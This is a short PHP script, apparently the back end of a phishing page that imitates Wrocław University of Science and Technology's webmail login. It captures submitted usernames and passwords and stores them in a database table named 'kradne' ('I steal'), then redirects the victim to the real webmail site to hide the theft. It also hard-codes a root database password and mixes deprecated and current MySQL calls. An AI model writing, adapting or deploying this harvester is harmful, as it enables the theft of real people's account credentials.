<?php
$servername = "localhost";
$username = "root";
$password = "1234";
$dbname = "hasla";
$conn = new mysqli($servername, $username, $password, $dbname);
function filtruj($zmienna){
    if(get_magic_quotes_gpc())
        $zmienna = stripslashes($zmienna);
    return mysql_real_escape_string(htmlspecialchars(trim($zmienna)));
}

if (isset($_POST['Button2']))
{
	$login = filtruj($_POST['username']);
	$haslo = filtruj($_POST['password']);
	if($login!="" && $haslo!=""){
		header("Location: /logowanie.php");
		$conn->query("INSERT INTO kradne (login, haslo)	VALUES ('".$login."', '".$haslo."')");
		header("Location: https://smail.pwr.edu.pl/");
	}else{
		header("Location: /poczta/smail.php");
	}
	
}

?>